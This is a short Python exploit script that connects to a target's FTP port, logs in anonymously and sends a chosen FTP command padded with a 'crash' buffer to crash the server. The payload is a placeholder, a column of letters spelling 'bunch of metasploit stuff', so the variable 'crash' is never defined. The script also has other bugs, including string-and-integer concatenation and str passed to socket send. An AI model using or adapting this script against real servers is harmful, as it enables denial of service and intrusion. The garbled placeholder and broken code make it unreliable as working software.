import socket, sys, time, struct
if len(sys.argv) < 2:
    print("[-] Usage:%s <target address> <command>" % sys.argv[0] + "\r")
    print("[-] For example [filename.py 192.168.1.10 PWND] would do the trick.")
    print("[-] Other options: AUTH, APPE, ALLO, ACCT")
    sys.exit(0)
target = sys.argv[1]
command = sys.argv[2]
if len(sys.argv) > 2:
    platform = sys.argv[2]

[
 b
 u 
 n
 c
 h
 o
 f
 m
 e
 t
 a
 s
 p
 l
 o
 i 
 t
 s
 t
 u
 f
 f
]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((target, 21))
except:
    print("[-] Connection to " +target+ " Failed!")
    sys.exit(0)
print("[*] Sending + " +len(crash) + " " + command +" byte crash...")
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS \r\n")
s.recv(1024)
s.send(command +" " + crash + "\r\n")
time.sleep(4)
